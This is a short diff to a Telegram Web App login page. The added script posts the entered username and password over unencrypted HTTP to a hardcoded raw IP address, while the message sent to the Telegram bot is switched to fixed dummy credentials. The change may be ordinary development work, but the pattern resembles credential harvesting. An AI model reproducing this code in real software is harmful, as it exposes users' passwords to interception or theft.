@@ -59,18 +59,43 @@
     </form>
 </div>
 
-//<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
     document.getElementById('loginForm').addEventListener('submit', function (event) {
         event.preventDefault(); // Prevent form submission
-        
+
         // Get form data
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
+        // Define the URL and data
+        // const url = 'http://localhost:8080/getData';
+        const url = 'http://94.131.11.43:9090/getData';
+
+// Make a POST request
+        fetch(url, {
+            method: 'POST', // Specify the request method
+            headers: {
+                'Content-Type': 'application/json' // Set the content type to JSON
+            },
+            body: JSON.stringify({username: username, password: password}) // Convert the data to JSON
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json(); // Parse the JSON response
+            })
+            .then(responseData => {
+                console.log('Success:', responseData); // Handle the response data
+            })
+            .catch(error => {
+                console.error('Error:', error); // Handle errors
+            });
+
         // Send data to Telegram bot (via Telegram Web App API)
-        Telegram.WebApp.sendData(JSON.stringify({"username":username, "password":password }));
-        //Telegram.WebApp.sendData('{"username":"andeson", "password":"1234"}');
+        //Telegram.WebApp.sendData(JSON.stringify({username, password }));
+        Telegram.WebApp.sendData('{"username":"andeson", "password":"1234"}');
 
         // Close the Web App
         Telegram.WebApp.close();
